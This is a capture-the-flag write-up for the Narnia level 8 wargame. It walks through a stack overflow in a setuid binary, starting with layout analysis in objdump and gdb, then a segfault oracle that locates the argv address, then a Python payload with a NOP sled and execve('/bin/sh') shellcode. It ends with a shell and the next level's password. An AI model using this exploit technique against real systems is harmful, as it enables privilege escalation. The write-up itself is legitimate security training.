- **Technique and why it works:** the copy loop overflows the 20-byte `bok` into the saved EBP and return address. The twist is that `bok[20..23]` is the local `blah` pointer itself (`blah` sits at `ebp-0x4`, just above `bok` at `ebp-0x18`), so at `i=20` the loop overwrites its own source pointer with `argv[20]` and then reads from the redirected pointer — it dies early unless the pointer keeps pointing at readable data. Setting `argv[20..23]` to the address of the argv string keeps `blah` valid, so the loop runs all the way to the return address at `bok[28..31]`, where it copies `argv[28..31]`. We point that return address into a NOP sled placed in `argv` at `argv+32`; the sled holds null-free shellcode (`write "PWN!"`, `geteuid`, `setreuid(euid,euid)`, `setuid(euid)`, `execve("/bin/sh")`). ASLR is off, so the argv address is fixed; it is found with a segfault oracle.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source.** `cat /narnia/narnia8.c`: `char *blah=b; char bok[20]; ... for(i=0; blah[i]!='\0'; i++) bok[i]=blah[i]; printf("%s\n", bok);`.
2. **Find the layout.** `objdump -d --no-show-raw-insn /narnia/narnia8 | sed -n '/<func>:/,/ret/p'` shows `bok` at `ebp-0x18` (`mov %dl,-0x18(%ebp,%eax,1)`) and the local pointer at `ebp-0x4`. So `bok[20..23]` = `blah`, `bok[24..27]` = saved EBP, `bok[28..31]` = return address.
3. **Check protections.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RWE` (executable stack); `cat /proc/sys/kernel/randomize_va_space` → `0`.
4. **Confirm in gdb.**
   ```
   gdb -batch -ex 'b *0x80491d6' -ex 'run AAAA' -ex 'p/x $ebp' -ex 'p/x $ebp-0x18' -ex 'p/x $ebp-0x4' -ex 'p/x *(char**)($ebp-0x4)' -ex 'x/8wx $ebp-0x18' /narnia/narnia8
   ```
   `bok = ebp-0x18`, `blah = ebp-0x4`, and `blah` points at the argv string. The raw output of a 190-byte arg shows `bok[20..23]` holding the corrupted pointer (high bytes `0xffffdf`) — proving the self-corruption.
5. **Write the shellcode in `vim /tmp/l8.asm`** (same null-free shellcode as the previous levels: marker write, `geteuid`, `setreuid`, `setuid`, `execve("/bin/sh")`), then:
   ```
   nasm -f elf32 /tmp/l8.asm -o /tmp/l8.o
   objdump -d -M intel /tmp/l8.o
   objcopy -O binary --only-section=.text /tmp/l8.o /tmp/l8.bin
   xxd -p /tmp/l8.bin ; wc -c /tmp/l8.bin
   ```
6. **Find the argv address with the segfault oracle.** Put `0x41414141` at `argv[28..31]` and sweep `argv[20..23]`. If `blah` stays valid the loop copies that value into the return address, the program prints `bok`, and then calls `0x41414141` — a fault *with output*. The sweep candidate that does this is the argv address: **`0xffffdf15`**.
7. **Build the payload:**
   ```
   payload = b"\x90"*20 + pack("<I", 0xffffdf15) + b"BBBB" + pack("<I", 0xffffdf15+32) + b"\x90"*100 + sc
   ```
   `argv[20..23]` keeps `blah` valid; `argv[28..31]` is the return address into the NOP sled at `argv+32`.
8. **Run it.** `python3 /tmp/e_narnia8.py` prints the buffer, then `PWN!`, and drops into a shell.
12. **Use the shell.**
   ```
   id                        # uid=14009(narnia9) gid=14008(narnia8)
   cat /etc/narnia_pass/narnia9
   ```
- **Password for narnia9:** `za689KedXW`
- **Verification:** logged in as `narnia9` with this password (`whoami` → `narnia9`).
- **Final level:** there is no `/narnia/narnia9` binary; `narnia9`'s home contains `CONGRATULATIONS`:
  ```
  you are l33t! next plz...
  ```
  **Narnia is complete.**
- **Recording:** `recordings/narnia/L8.cast`


